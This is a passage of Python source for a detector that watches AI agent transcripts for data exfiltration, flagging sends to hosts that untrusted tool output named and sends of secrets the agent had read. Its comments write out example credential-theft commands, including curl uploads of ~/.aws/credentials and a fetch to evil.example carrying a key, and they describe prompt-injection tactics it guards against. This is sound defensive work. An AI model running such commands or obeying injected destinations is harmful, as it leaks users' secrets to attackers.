    out: set[str] = set()
    if key in _READ_KEYS:
        if (n := _canon(text)):
            out.add(n)
        return out
    for seg, _ in _segments(text[:MAX_BLOCK_CHARS], limit=_PATH_LIMIT):
        seg = _unwrap(seg)
        if not seg:
            continue
        prog = _prog(seg[0])
        if prog in _SHELLS:
            inner = _shell_c_command(seg[1:])
            if inner is not None:
                out |= _read_paths("command", inner)
            continue
        reader = prog in _READERS
        operands = seg[1:] if reader else seg
        if prog in _PATTERN_FIRST:
            given = any(a in ("-e", "-f", "--regexp", "--file") for a in operands)
            positional = [i for i, a in enumerate(operands) if not a.startswith("-")]
            if not given and positional:
                operands = operands[:positional[0]] + operands[positional[0] + 1:]
        for w in operands:
            n = _canon(w)
            if n and (reader or _PATHLIKE.search(n) or n.startswith("~/")):
                out.add(n)
    return out


# Options of a wrapper that take the next word, and how many operands the
# wrapper reads before the program: `timeout 5 curl`, `sudo -u root curl`.
_WRAPPER_OPTION_ARGS = {
    "sudo": frozenset("CDghprtUu"), "doas": frozenset("Cu"), "timeout": frozenset("ks"),
    "nice": frozenset("n"), "xargs": frozenset("adEILnPs"), "env": frozenset("CSu"),
    "stdbuf": frozenset("eio"), "time": frozenset("fo"), "exec": frozenset("a")}
_WRAPPER_OPERANDS = {"timeout": 1}


def _unwrap(seg: list[str]) -> list[str]:
    """Drop `sudo`, `env VAR=x`, `timeout 5`, `nohup` and friends to reach
    the program."""
    i = 0
    takes: frozenset[str] = frozenset()
    operands = 0
    while i < len(seg):
        w = seg[i]
        prog = _prog(w)
        if prog in _WRAPPERS:
            takes = _WRAPPER_OPTION_ARGS.get(prog, frozenset())
            operands = _WRAPPER_OPERANDS.get(prog, 0)
            i += 1
        elif w.startswith("-"):
            # `-u root`: a wrapper option whose value is the next word.
            i += 2 if len(w) == 2 and w[1] in takes else 1
        elif "=" in w and not w.startswith(("/", ".", "~")):
            i += 1
        elif operands:
            operands -= 1
            i += 1
        else:
            break
    return seg[i:]


def _url_key(key: str) -> bool:
    return key in _URL_KEYS or key.endswith(("_url", "_uri", "_endpoint", "_host"))


def _command_key(key: str) -> bool:
    return key in _COMMAND_KEYS or key.endswith(("_command", "_cmd", "_script"))


def _shell_tool(name: str | None) -> bool:
    if not name:
        return False
    if name.lower() in _SHELL_TOOLS:
        return True
    words = _name_words(name)
    return bool(words & _SHELL_WORDS) or bool(words & _COMMAND_WORDS and words & _EXEC_WORDS)


# Where a word is cut to find a path inside it: `$(cat x)`, `open('x')`,
# `f=@x`, `a,x`.
_MENTION_SPLIT = re.compile(r"""\$\(|[\s`();|,'"=]+""")


def _mentions(text: str, tainted: set[str]) -> set[str]:
    """Tainted paths this text names, however it spells them.

    Every shell word is canonicalised and compared against the tainted set,
    so bare names and `$(cat x)` join; comparing against a known set is what
    lets this be looser than `_read_paths` without adding noise.
    """
    if not tainted:
        return set()
    words = _words(text[:MAX_BLOCK_CHARS])
    parts = {p for w in words for p in _MENTION_SPLIT.split(w) if p}
    return {n for p in parts if (n := _canon(p)) and n in tainted}


def _name_words(name: str) -> set[str]:
    spaced = re.sub(r"([a-z])([A-Z])", r"\1 \2", name)
    return {w.lower() for w in re.split(r"[^A-Za-z]+", spaced) if w}


def _sending_tool(name: str | None) -> bool:
    if not name:
        return False
    words = _name_words(name)
    return bool(words & _SEND_VERBS) and not words & _READ_VERBS


# Tool names kept verbatim in a finding. Any other is sender data -- an MCP
# server names its own tools -- and a plain-looking identifier can still
# carry a credential: `send_AKIA...` passed the core scrub, whose detectors
# anchor on a word boundary the underscore removes. So a name is kept only
# if it is one of these, and otherwise replaced by a salted digest, which
# still groups findings from the same tool.
_KNOWN_TOOLS = frozenset({
    "Bash", "Shell", "PowerShell", "bash", "shell", "powershell",
    "WebFetch", "WebSearch", "web_fetch", "web_search",
    "Read", "Write", "Edit", "MultiEdit", "NotebookEdit", "Glob", "Grep",
    "Task", "Agent", "read", "write", "edit", "glob", "grep"})


def _safe_tool_name(name: str | None, salt: str) -> str | None:
    if not name:
        return None
    if name in _KNOWN_TOOLS:
        return name
    return f"<tool:{digest(name, salt)[:12]}>"


def _walk(value, path: str, budget: _Budget | None = None, key: str = "",
          depth: int = 0) -> Iterator[tuple[str, str, str]]:
    """(structural locator, final key or '', text) for every string.

    One `budget` is shared by the whole walk. A per-string cap alone let a
    block of 64 strings of 1 MiB each be read in full, and a list of a
    million integers be visited element by element.
    """
    budget = budget if budget is not None else _Budget()
    if depth > 8 or budget.spent():
        return
    budget.nodes -= 1
    if isinstance(value, str):
        text = value[:budget.chars]
        budget.chars -= len(text)
        yield path, key, text
    elif isinstance(value, dict):
        for i, (k, v) in enumerate(value.items()):
            if budget.spent():
                return
            name = str(k).lower() if isinstance(k, str) else ""
            seg = f".{name}" if name in _SAFE_KEYS else f"[#{i}]"
            yield from _walk(v, path + seg, budget, name, depth + 1)
    elif isinstance(value, list):
        for i, v in enumerate(value):
            if budget.spent():
                return
            yield from _walk(v, f"{path}[{i}]", budget, key, depth + 1)


def _block_texts(block: dict) -> Iterable[str]:
    btype = block.get("type")
    if btype == "text":
        yield str(block.get("text") or "")
    elif btype == "tool_result":
        for _, _, t in _walk(block.get("content"), "c", _Budget()):
            yield t
    elif btype == "attachment":
        yield str(block.get("text") or "")
        yield str(block.get("file_name") or "")


def _covered(host: str, roots: set[str]) -> bool:
    """The host, or a parent named as a root, is in `roots`.

    `docs.example.com` is covered by `example.com`; naming
    `docs.example.com` does not vouch for its parent. An IP literal is only
    ever covered by itself.
    """
    if host in roots:
        return True
    if not _HOSTNAME.match(host):
        return False
    parts = host.split(".")
    return any(".".join(parts[i:]) in roots for i in range(1, len(parts) - 1))


def _trust_roots(hosts: Iterable[str]) -> set[str]:
    """Hosts usable as trust roots: never a bare TLD or a public suffix."""
    return {h for h in hosts if "." in h and h not in _PUBLIC_SUFFIXES}


def _chain(fingerprints: Sequence[str]) -> str:
    """One digest over the fingerprints of a prefix, in order.

    The whole prefix, not just its last message: compaction rewrites EARLIER
    turns, and resuming over a history whose start changed would judge new
    actions against sources that are gone.
    """
    h = hashlib.sha256()
    for f in fingerprints:
        h.update(f.encode())
    return h.hexdigest()


def _fingerprint(msg) -> str:
    """Cheap identity for a message, to resume a session from where it was.

    Built from structure and bounded prefixes, not the whole message: a
    64 MiB tool result must not be serialised to be recognised.
    """
    h = hashlib.sha256()
    budget = _Budget(chars=1 << 30, nodes=FINGERPRINT_NODES)
    if isinstance(msg, dict):
        role = msg.get("role")
        h.update(_utf8(role[:512] if isinstance(role, str) else repr(type(role))))
        content = msg.get("content")
        blocks = content if isinstance(content, list) else [content]
        h.update(f"#{len(blocks)}".encode())
        for b in blocks:
            if budget.spent():
                break
            budget.nodes -= 1
            if isinstance(b, dict):
                for k in ("type", "id", "tool_use_id", "tool_name"):
                    v = b.get(k)
                    v = v if isinstance(v, str) else repr(type(v))
                    h.update(_utf8(f"|{len(v)}:{v[:512]}"))
                for k in ("text", "content", "input"):
                    # Length and a short prefix of each string, never a
                    # serialisation: a tool result sent as a list of parts
                    # was JSON-encoded whole before being cut, on every frame.
                    for _, _, s in _walk(b.get(k), "", budget):
                        h.update(_utf8(f"|{len(s)}:{s[:512]}"))
            else:
                s = b if isinstance(b, str) else repr(type(b))
                h.update(_utf8(f"|{len(s)}:{s[:512]}"))
    return h.hexdigest()


def _utf8(text: str) -> bytes:
    """`text` as UTF-8, a lone surrogate -- which a JSON `\\ud800` escape
    produces -- included."""
    return text.encode("utf-8", "surrogatepass")


@dataclass
class _State:
    processed: int = 0
    last: str = ""
    # Blocks of message `processed` already read, when a pass stopped inside
    # it, and that message's fingerprint.
    block: int = 0
    partial: str = ""
    trusted: set[str] = field(default_factory=set)
    untrusted: set[str] = field(default_factory=set)
    # `untrusted` reached MAX_HOSTS: a host it lacks may still have been
    # named by untrusted content.
    untrusted_full: bool = False
    findings: list[Finding] = field(default_factory=list)
    # Non-host destinations the user named: `#security`, `@ops`, a word.
    trusted_tokens: set[str] = field(default_factory=set)
    # Taint: the files each call read, kept until that call's result
    # arrives, and what earlier results made sensitive -- the digests of
    # values the DLP tiers found in them, and the paths whose reads
    # returned such a value.
    paths_by_call: dict[str, set[str]] = field(default_factory=dict)
    tainted_hashes: set[str] = field(default_factory=set)
    tainted_paths: set[str] = field(default_factory=set)

    def add_untrusted(self, hosts: set[str]) -> None:
        room = MAX_HOSTS - len(self.untrusted)
        if len(hosts) <= room:
            self.untrusted |= hosts
            return
        new = hosts - self.untrusted
        self.untrusted.update(list(new)[:max(room, 0)])
        if len(new) > room:
            self.untrusted_full = True

    def add_trusted(self, hosts: set[str]) -> None:
        room = MAX_HOSTS - len(self.trusted)
        self.trusted.update(hosts if len(hosts) <= room else list(hosts)[:max(room, 0)])

    def named_by_untrusted(self, host: str) -> bool:
        return self.untrusted_full or _covered(host, self.untrusted)


@dataclass
class Outcome:
    """What one frame's pass found, and which checks it did not finish.

    `dropped` names the checks -- `provenance`, `taint` -- whose verdict on
    this frame is incomplete: the pass stopped at its deadline before the
    last block, or raised. A caller adds them to the scan's
    `detectors_skipped`, so `on_tier_dropped` applies and the stored row
    records them.
    """

    findings: list[Finding]
    dropped: list[str]
    # What the pass raised, when it raised; `dropped` then names every check.
    error: Exception | None = None


def run(detector: ProvenanceDetector, messages: Sequence, *, session: tuple | None,
        findings: Sequence[Finding], time_budget_s: float) -> Outcome:
    """`detector.check`, with an exception returned as an Outcome that drops
    every check rather than raised. Every adapter calls this, so a failed or
    cut-short pass reaches its `detectors_skipped` the same way."""
    try:
        return detector.check(messages, session, time_budget_s, findings)
    except Exception as exc:  # noqa: BLE001 - reported as dropped checks
        return Outcome([], detector.checks, exc)


def request_time_budget(budget) -> float:
    """Seconds a pass inside a request may take: TIME_BUDGET_S, or what is
    left of the scan's `budget` when that is less."""
    return min(TIME_BUDGET_S, budget.remaining_ms / 1000.0)


class ProvenanceDetector:
    """Behavioural checks over an inference-hook transcript.

    PROVENANCE: a sending action aimed at a destination untrusted content
    named. TAINT: a sending action carrying data the DLP tiers found in
    something the agent read -- the value itself, or the file it came from --
    to a destination the user did not name. Either can be off; they share
    one pass over the transcript because both need its order, who wrote
    each block and which calls send.
    """

    name = "provenance"
    finding_prefix = "provenance"
    tier = 0

    def __init__(self, severity: str = "warn", salt: str = "",
                 allow_hosts: Sequence[str] = (),
                 max_sessions: int = MAX_SESSIONS, *, provenance: bool = True,
                 taint_severity: str | None = None) -> None:
        self.severity = severity
        self.provenance = provenance
        self.taint_severity = taint_severity
        self._salt = salt
        # A path digest must not be recoverable. `digest(path, "")` is a bare
        # sha256, and `~/.aws/credentials` is one guess. With no deployment
        # salt, a key that lives only in this process is used instead: it
        # joins nothing across replicas, and path digests join nothing anyway.
        self._path_key = salt or secrets.token_hex(16)
        self._allow = _trust_roots(h for h in (_host(str(a)) for a in allow_hosts) if h)
        self._sessions: OrderedDict[tuple, _State] = OrderedDict()
        self._max_sessions = max_sessions
        # Callers run this on worker threads -- the verdict server and /scan
        # both move scanning off the event loop -- and a session's state is
        # mutated in place while its frame is walked. One lock per session,
        # so two frames of one session cannot interleave their updates, and
        # frames of different sessions do not wait on each other.
        self._lock = threading.Lock()
        self._session_locks: dict[tuple, threading.Lock] = {}

    @property
    def checks(self) -> list[str]:
        """The policy names of the checks this runs: what a caller records as
        dropped when a pass raises or is cut short."""
        return (["provenance"] if self.provenance else []) + (
            ["taint"] if self.taint_severity else [])

    def analyze(self, messages: Sequence, session: tuple | None = None,
                time_budget_s: float = TIME_BUDGET_S,
                findings: Sequence[Finding] = ()) -> list[Finding]:
        """The findings of `check`, for a caller with no use for `dropped`."""
        return self.check(messages, session, time_budget_s, findings).findings

    def check(self, messages: Sequence, session: tuple | None = None,
              time_budget_s: float = TIME_BUDGET_S,
              findings: Sequence[Finding] = ()) -> Outcome:
        """`findings` are the frame's DLP findings, which taint joins on.

        The scan core re-emits a session's earlier findings on every frame,
        so they cover the whole transcript, not only what is new.
        """
        if session is None:
            return self._analyze(messages, None, time_budget_s, findings)
        with self._lock:
            lock = self._session_locks.setdefault(session, threading.Lock())
        with lock:
            return self._analyze(messages, session, time_budget_s, findings)

    def _analyze(self, messages: Sequence, session: tuple | None,
                 time_budget_s: float, findings: Sequence[Finding]) -> Outcome:
        clock = _Clock(time.monotonic() + time_budget_s)
        msgs = list(messages or [])
        # Fingerprinted once per frame. Each is bounded, so this is linear
        # in the number of messages and not in their content.
        fps = [_fingerprint(m) for m in msgs]
        state = self._resume(session, fps)
        by_block: dict[tuple[int, int], list[Finding]] = {}
        if self.taint_severity:
            for f in findings:
                m = BLOCK_LOCATOR.match(f.locator or "")
                if m and not f.detector.startswith(NOT_TAINT_SOURCES):
                    by_block.setdefault((int(m.group(1)), int(m.group(2))), []).append(f)
        idx = state.processed
        if state.block and (idx >= len(fps) or fps[idx] != state.partial):
            state.block = 0
        try:
            while idx < len(msgs):
                self._message(idx, msgs[idx], state, by_block, clock)
                idx += 1
                state.block = 0
        except _OutOfTime:
            # The next frame starts at the block in hand. Every set here is
            # idempotent and findings are de-duplicated, so a block read
            # twice adds nothing twice.
            state.partial = fps[idx]
        state.processed = idx
        state.last = _chain(fps[:idx])
        state.findings = list(dict.fromkeys(state.findings))[-MAX_SESSION_FINDINGS:]
        if session is not None:
            with self._lock:
                self._sessions[session] = state
                self._sessions.move_to_end(session)
                while len(self._sessions) > self._max_sessions:
                    evicted, _ = self._sessions.popitem(last=False)
                    self._session_locks.pop(evicted, None)
        return Outcome(list(state.findings), [] if idx >= len(msgs) else self.checks)

    def _resume(self, session: tuple | None, fps: list[str]) -> _State:
        with self._lock:
            prior = self._sessions.get(session) if session is not None else None
        if (prior is not None and prior.processed + prior.block > 0
                and prior.processed <= len(fps)
                and _chain(fps[:prior.processed]) == prior.last):
            # Reused, not copied: `processed` advances only after a pass
            # completes, and every other field is a set or a de-duplicated
            # list, so a pass that fails halfway leaves nothing a retry
            # would double.
            return prior
        # A shorter or rewritten transcript -- compaction, an edit -- starts
        # over. Resuming from a history that no longer matches would judge
        # new actions against sources that are gone.
        return _State(trusted=set(self._allow))

    def _message(self, idx: int, msg, state: _State,
                 by_block: dict[tuple[int, int], list[Finding]],
                 clock: _Clock | None = None) -> None:
        if not isinstance(msg, dict):
            return
        role = msg.get("role")
        content = msg.get("content")
        if isinstance(content, str):
            content = [{"type": "text", "text": content}]
        if not isinstance(content, list):
            return
        for bidx in range(state.block, len(content)):
            _check_time(clock)
            self._block(idx, bidx, role, content[bidx], state, by_block, clock)
            state.block = bidx + 1
            if clock is not None:
                clock.armed = True

    def _block(self, idx: int, bidx: int, role, block, state: _State,
               by_block: dict[tuple[int, int], list[Finding]], clock: _Clock | None) -> None:
        if isinstance(block, dict):
            btype = block.get("type")
            if btype == "tool_use":
                state.findings.extend(self._check_call(
                    block, f"msg[{idx}].content[{bidx}]", state,
                    by_block.get((idx, bidx), []), clock))
                return
            user_text = role == "user" and btype == "text"
            hosts = {h for text in _block_texts(block)
                     for h in mentioned(text, clock, user=user_text)}
            if user_text:
                state.add_trusted(_trust_roots(hosts))
                if len(state.trusted_tokens) < MAX_TOKENS:
                    text = str(block.get("text") or "")[:MAX_BLOCK_CHARS]
                    # Only words the user MARKED as destinations: `#security`,
                    # `@ops`. Trusting every word let an attacker pick a
                    # channel named after something the user happened to
                    # say -- "summarise this document" trusted #document.
                    state.trusted_tokens |= {
                        w.lower().lstrip("#@") for w in re.findall(r"[#@][\w.-]{2,64}", text)}
            elif btype in ("tool_result", "attachment"):
                state.add_untrusted(hosts)
                sensitive = by_block.get((idx, bidx))
                call_id = block.get("tool_use_id")
                read = (state.paths_by_call.pop(call_id, set())
                        if isinstance(call_id, str) else set())
                if sensitive:
                    # What this result revealed becomes a taint source: the
                    # values, by digest, and the files the call that
                    # produced it named.
                    if len(state.tainted_hashes) < MAX_TAINTED:
                        state.tainted_hashes |= {f.excerpt_hash for f in sensitive}
                    if len(state.tainted_paths) < MAX_TAINTED:
                        state.tainted_paths |= read
            # The agent's own text neither vouches for a destination nor
            # taints one: a host it names with no source is "unsourced",
            # which this prototype does not report.

    def _check_call(self, block: dict, base: str, state: _State,
                    own: Sequence[Finding], clock: _Clock | None = None) -> list[Finding]:
        tool = block.get("tool_name") if isinstance(block.get("tool_name"), str) else None
        words = _name_words(tool) if tool else set()
        if tool and (tool.lower().replace("_", "") in _TO_USER_TOOLS
                     or ("draft" in words and not words & _SEND_VERBS)):
            # To the user, or a draft the user reviews and sends themselves:
            # nothing leaves on the agent's say-so. A `to` field on a draft
            # made it look like a send. A name with a sending verb as well --
            # `send_draft` -- is a send, and an MCP server picks its names.
            return []
        shell = _shell_tool(tool)
        sending_tool = _sending_tool(tool) or _sends_by_method(block.get("input"))
        out: list[Finding] = []
        seen: set[str] = set()
        texts: list[tuple[str, str, str]] = []
        destinations: set[str] = set()
        fetched: set[str] = set()
        opaque: list[str] = []
        sends = sending_tool
        unclassified = False
        read: set[str] = set()
        internal = False

        for locator, key, text in _walk(block.get("input"), f"{base}.input"):
            _check_time(clock)
            texts.append((locator, key, text))
            command = shell or _command_key(key)
            if command or key in _READ_KEYS:
                read |= _read_paths("command" if command else key, text)
            if key in _INTERNAL_KEYS:
                internal = True
                continue
            if sending_tool and not shell and not command and not _url_key(key) and key not in (
                    _RECIPIENT_KEYS | _OPAQUE_KEYS | _PAYLOAD_KEYS | _FILE_KEYS):
                unclassified = True
            if command:
                sent, targets = shell_sends(text, clock)
                sends = sends or sent
            elif key in _RECIPIENT_KEYS:
                targets = _recipient_hosts(text)
                sends = True
            elif _url_key(key):
                targets = _urls(text) or {h for h in [_host(text)] if h}
                if not sending_tool:
                    # A fetch: its URL is no destination for provenance,
                    # but a value carried in it reaches that host.
                    fetched |= targets
                    continue
            elif sending_tool and key in _OPAQUE_KEYS:
                opaque.append(text.strip().lower().lstrip("#@"))
                continue
            else:
                continue
            destinations |= targets
            if not self.provenance:
                continue
            for host in sorted(targets):
                if host in seen or _covered(host, state.trusted):
                    continue
                seen.add(host)
                if state.named_by_untrusted(host):
                    out.append(Finding(
                        detector=DETECTOR, severity=self.severity,
                        locator=locator, excerpt_hash=digest(host, self._salt),
                        tool_name=_safe_tool_name(tool, self._path_key)))

        call_id = block.get("id")
        if isinstance(call_id, str) and read:
            state.paths_by_call[call_id] = read
            # Oldest first. A read is dropped only if more than this many
            # calls are waiting on their results at once.
            while len(state.paths_by_call) > MAX_PENDING_CALLS:
                state.paths_by_call.pop(next(iter(state.paths_by_call)))

        # Only when every other field is understood: `agent_id` beside an
        # unread `queue="#evil"` says nothing about where the rest goes.
        if internal and not destinations and not opaque and not unclassified:
            return out
        if self.taint_severity and (sends or fetched):
            hit = (self._taint(base, texts, destinations, opaque, unclassified,
                               shell, state, own) if sends
                   else self._taint_in_url(base, fetched, state, own))
            if hit:
                locator, excerpt = hit
                out.append(Finding(
                    detector=TAINT_DETECTOR, severity=self.taint_severity,
                    locator=locator, excerpt_hash=excerpt,
                    tool_name=_safe_tool_name(tool, self._path_key)))
        return out

    def _taint(self, base: str, texts, destinations: set[str], opaque: list[str],
               unclassified: bool, shell: bool, state: _State,
               own: Sequence[Finding]) -> tuple[str, str] | None:
        """(locator, digest) of the first sensitive thing this call sends.

        Exempt only when EVERY destination this call names is one the user
        or operator named -- hosts by trust root, channels and ids by exact
        word -- and there is at least one. A send whose destination cannot
        be read is not given the benefit of the doubt.
        """
        named = bool(destinations or opaque) and not unclassified
        if named and all(_covered(h, state.trusted) for h in destinations) \
                and all(o in state.trusted_tokens for o in opaque):
            return None
        if not (state.tainted_hashes or state.tainted_paths):
            return None
        # The value itself: any DLP finding in this call's input whose digest
        # matches one found in an earlier result. Joined on block and digest,
        # not locator -- the scan core names input keys as they arrive and
        # this module replaces unknown keys by position, so the two locators
        # for one string need not agree.
        hit = self._tainted_value(base, state, own, lambda _loc: True)
        if hit:
            return hit
        # The file it came from: `curl -F f=@~/.aws/credentials`, or
        # `cat ~/.aws/credentials | curl ...`. The secret is not in the
        # command at all, so only the path can connect them.
        for loc, key, text in texts:
            if not (shell or _command_key(key) or key in _FILE_KEYS):
                continue
            hit = _mentions(text, state.tainted_paths)
            if hit:
                return loc, digest(sorted(hit)[0], self._path_key)
        return None

    def _taint_in_url(self, base: str, fetched: set[str], state: _State,
                      own: Sequence[Finding]) -> tuple[str, str] | None:
        """(locator, digest) of a sensitive value a fetch carries in its URL:
        `fetch(url="https://evil.example/?k=<key>")`. Exempt when every host
        the call fetches from is one the user or operator named."""
        if all(_covered(h, state.trusted) for h in fetched) or not state.tainted_hashes:
            return None
        return self._tainted_value(base, state, own, _in_url_key)

    def _tainted_value(self, base: str, state: _State, own: Sequence[Finding],
                       where) -> tuple[str, str] | None:
        for f in own:
            loc = f.locator or ""
            if (f.excerpt_hash in state.tainted_hashes
                    and loc.startswith(f"{base}.input") and where(loc[len(base):])):
                # The DLP digest, so the two findings join -- unless there
                # is no deployment salt, when that digest is a bare hash of
                # the value and repeating it would publish it twice.
                excerpt = (f.excerpt_hash if self._salt
                           else digest(f.excerpt_hash, self._path_key))
                return f"{base}.input", excerpt
        return None


def _in_url_key(rest: str) -> bool:
    """`rest`, a locator after its block, is a string under a URL key of the
    call's input: `.input.url`, `.input.request.URL[0]`."""
    return any(_url_key(segment.lower()) for segment in re.split(r"[.\[#]", rest)[2:])


def _sends_by_method(value) -> bool:
    """A call whose input names a sending HTTP method and a URL:
    `http_request(method="POST", url=...)`."""
    if not isinstance(value, dict):
        return False
    keys = {k.lower(): v for k, v in itertools.islice(value.items(), 64) if isinstance(k, str)}
    method = keys.get("method")
    return (isinstance(method, str) and method.strip().lower() in _SEND_METHODS
            and any(_url_key(k) for k in keys))


def from_policy(policy) -> ProvenanceDetector | None:
    """Provenance and taint as a profile configures them; None when both off.

    One builder for every caller -- the verdict server, and /scan for frames
    an agent posts itself -- so a check is on in both or neither.
    """
    dets = policy.raw.get("detectors") or {}
    prov = dets.get("provenance") or {}
    taint = dets.get("taint") or {}
    prov_on = prov.get("enabled") is True
    taint_on = taint.get("enabled") is True
    if not (prov_on or taint_on):
        return None
    return ProvenanceDetector(
        severity=str(prov.get("severity") or "warn"),
        salt=policy.hash_salt,
        allow_hosts=[str(h) for h in (prov.get("allow_hosts") or [])],
        provenance=prov_on,
        taint_severity=str(taint.get("severity") or "warn") if taint_on else None,
    )


def from_compliance(messages: Sequence) -> list:
    """A Compliance API transcript in the frame shape the checks read.

    Positions are kept -- the same message and block indices -- so taint
    joins on the scanner's findings exactly as it does on adapter 1's.
    Three differences are translated:

    * a tool call names its tool in `name`, not `tool_name`;
    * its `input` is a JSON-encoded string, parsed back into an object --
      unless the block is `truncated`, when it is no longer valid JSON and
      is kept as the string it is;
    * a message with `provenance` set is synthetic -- the system prompt
      placeholder arrives as a `user` turn -- and is not the user's own
      words, so it is given a role the checks never treat as trusted.
    """
    out: list = []
    for msg in messages or []:
        if not isinstance(msg, dict):
            out.append(msg)
            continue
        role = msg.get("role")
        if msg.get("provenance"):
            role = "synthetic"
        blocks = []
        for block in msg.get("content") or []:
            if not isinstance(block, dict):
                blocks.append(block)
                continue
            b = dict(block)
            if "tool_name" not in b and isinstance(b.get("name"), str):
                b["tool_name"] = b["name"]
            if b.get("type") == "tool_use" and isinstance(b.get("input"), str) \
                    and not b.get("truncated"):
                with contextlib.suppress(ValueError):
                    b["input"] = load_json(b["input"])
            blocks.append(b)
        out.append({"role": role, "content": blocks})
    return out
